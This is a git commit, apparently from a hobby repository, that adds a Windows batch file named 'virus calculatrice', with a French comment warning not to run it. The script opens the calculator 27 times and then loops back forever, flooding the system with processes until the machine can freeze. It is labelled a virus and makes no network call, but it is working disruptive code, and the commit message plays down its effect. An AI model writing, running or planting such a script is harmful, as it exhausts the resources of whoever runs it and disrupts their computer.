6669cfabd8f22b0173b41a49e12905129bd3fd94
Miaouxx-Dev-clg <baptiste.henandez@ik.me>
2026-06-16 11:21:06 +0200

    Create a batch file to launch multiple calculators
    This batch file launches multiple instances of the calculator application in a loop.

--- virus/calculatrice.bat
+++ virus/calculatrice.bat
@@ -1,1 +1,32 @@
-
+@echo off
+title virus calculatrice
+#ne lancer pas ce programme
+:menu
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+start calc.exe
+goto :menu
